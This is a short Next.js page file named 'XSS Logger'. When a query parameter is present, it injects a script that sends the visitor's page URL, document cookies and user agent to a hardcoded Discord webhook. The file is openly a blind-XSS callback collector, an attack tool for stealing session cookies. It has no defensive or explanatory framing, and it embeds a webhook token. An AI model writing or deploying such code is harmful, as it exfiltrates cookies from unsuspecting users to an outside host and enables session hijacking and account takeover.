export async function getServerSideProps(context) {
  const data = context.query.data || null;
  return {
    props: { data }, // 
  };
}

export default function Home({ data }) {
  return (
    <html>
      <head>
        <title>XSS Logger</title>
      </head>
      <body>
        <h1>Hi</h1>
        {data && (
          <script dangerouslySetInnerHTML={{
            __html: `
              fetch("https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                  content: "Blind XSS Triggered!\\nURL: " + window.location.href + "\\nCookies: " + document.cookie + "\\nUA: " + navigator.userAgent
                })
              });
            `
          }} />
        )}
      </body>
    </html>
  );
}

